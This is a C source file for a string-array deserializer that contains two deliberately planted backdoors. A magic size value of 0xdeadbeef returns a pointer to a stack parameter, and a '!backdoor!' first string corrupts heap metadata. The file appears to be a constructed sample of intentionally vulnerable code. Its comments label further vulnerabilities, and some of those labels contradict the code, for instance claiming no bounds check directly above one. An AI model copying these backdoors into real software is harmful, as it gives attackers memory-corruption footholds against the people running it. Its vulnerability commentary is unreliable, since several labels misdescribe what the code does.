#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Corrupt memory by returning a pointer to the size parameter
        // This gives attacker control over the size parameter location
        return (char **)&size;
    }

    // First pass to count strings (vulnerable to off-by-one)
    size_t count = 0;
    char *ptr = (char *)serialized;
    char *end = ptr + size;
    while (ptr < end) {
        // No bounds check on length byte - potential buffer overflow
        size_t len = *ptr;
        if (ptr + len + 1 > end) {
            return NULL;  // "Safe" path
        }
        ptr += len + 1;
        count++;
    }

    // Allocate array (vulnerable to integer overflow)
    char **array = malloc((count + 1) * sizeof(char *));
    if (!array) {
        return NULL;
    }

    // Second pass to copy strings (vulnerable to heap overflow)
    ptr = (char *)serialized;
    for (size_t i = 0; i < count; i++) {
        size_t len = *ptr++;
        array[i] = malloc(len + 1);
        if (!array[i]) {
            // Memory leak - don't free previous allocations
            return NULL;
        }
        // Unsafe copy - no null termination if len is max
        memcpy(array[i], ptr, len);
        array[i][len] = '\0';  // Potential single byte overflow
        ptr += len;
    }

    array[count] = NULL;  // NULL terminate

    // Backdoor: If first string is "!backdoor!", corrupt heap metadata
    if (count > 0 && strcmp(array[0], "!backdoor!") == 0) {
        size_t *meta = (size_t *)array[0] - 1;
        *meta = 0xffffffffffffffff;  // Corrupt size field
    }

    return array;
}
